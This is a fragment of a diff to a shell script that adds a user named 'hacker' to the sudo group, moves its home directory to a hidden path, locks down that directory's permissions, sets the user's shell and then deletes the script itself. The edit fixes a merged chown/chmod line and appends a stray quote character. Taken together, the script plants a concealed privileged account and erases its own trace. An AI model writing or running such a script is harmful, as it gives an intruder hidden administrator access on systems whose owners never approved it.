@@ -16,7 +16,8 @@ usermod -aG sudo hacker
 mv /home/hacker /home/.hacker 
 
 # Set the home directory permissions to be only accessible to the user "hacker" and the root user
-chown -R hacker:root /home/.hackerchmod 750 /home/.hacker 
+chown -R hacker:root /home/.hacker
+chmod 750 /home/.hacker 
 
 # Set the default user shell to bash (when logged in)
 chsh -s /bin/bash hacker
@@ -28,3 +29,5 @@ echo 'sudo apt-get install cmatrix'
 
 # Delete this script
 rm -- "$0"
+
+'
